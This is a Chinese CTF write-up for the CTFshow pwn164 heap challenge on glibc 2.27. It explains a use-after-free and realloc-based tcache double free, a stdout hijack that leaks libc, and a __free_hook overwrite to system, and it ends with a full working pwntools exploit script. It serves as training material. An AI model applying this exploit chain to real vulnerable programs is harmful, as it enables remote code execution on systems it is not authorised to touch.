---
title: CTFshow pwn164
tags:
    - pwn
    - tcachebin dup
categories:
    - 做题笔记
cover: /img/阿尼亚.png
---
# CTFshow pwn164 （tcache dup）

## 前言
​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。
​        **七剑下天山** 遇上 **双料特工** ，简直无敌了。

## ida分析

### delete功能
![image-20250530200643343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png)
1.典型的uaf 没有置空，但是ptr是哪来的?
2.继续看，add功能

### add功能
![image-20250530200820909](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png)
1.ptr在这里，也就是刚刚分配的堆块的指针。
2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size>=size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。

### 神秘选项
![image-20250530201556131](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png)
1.一次置空ptr的机会

## 思路分析
1.首先还是查看保护机制--全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：
![image-20250530210823813](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png)

2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：
![image-20250530212136953](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png)

3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置"/bin/sh;" 最后free() 就可以触发，getshell了

## exp
```python 
from esy import *
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h','-l','66%']
io,elf=loadfile("pwn","pwn.challenge.ctf.show",28309)
libc=ELF("/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6")


def add(size,content):
    io.sendafter("Choice:","1")
    io.sendafter("Size?\n",str(size))
    io.sendafter("Content?\n",content)
def free():
    io.sendafter("Choice:","2")
def tozero():
    io.sendafter("Choice:","1433233")

add(0x70,b'a')
add(0,b'') 
add(0x100,b'a')
add(0,b'')

add(0xa0,b'a')
add(0,b'')
add(0x100,b'a')
# 填满tcache bins
[free() for i in range(7)]

add(0,b'')
add(0x70,b'a')
add(0x180,b'c'*0x78+p64(0x41)+p8(0x60)+p8(0xc7))
add(0,b'')

add(0x100,b'a')
add(0,b'')

# 劫持IO
add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))
libc_base = u64(io.recvuntil(b"\x7f",timeout=0.1)[-6:].ljust(8,b'\x00'))-0x3e82a0
#libc_base = u64(io.recv(6).ljust(8,b'\x00'))-0x3e82a0
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym['system']
one_gadget = libc_base + 0x4f322
logvalue("libc_base",hex(libc_base))
logvalue("free",hex(free_hook))
logvalue("system",hex(system))

tozero()
add(0x120,b'a')
add(0,b'')
add(0x130,b'a')
add(0,b'')
add(0x140,b'a')
add(0,b'')
add(0x130,b'a')
[free() for i in range(7)]
add(0,b" ")
add(0x120,b'a')
#gdb.attach(io)
add(0x260,b'a'*0x128+p64(0x131)+p64(free_hook-8))
add(0,b'')
add(0x130,b'a')
add(0,b'')
add(0x130,b"/bin/sh;"+p64(system))
free()

io.interactive()
```

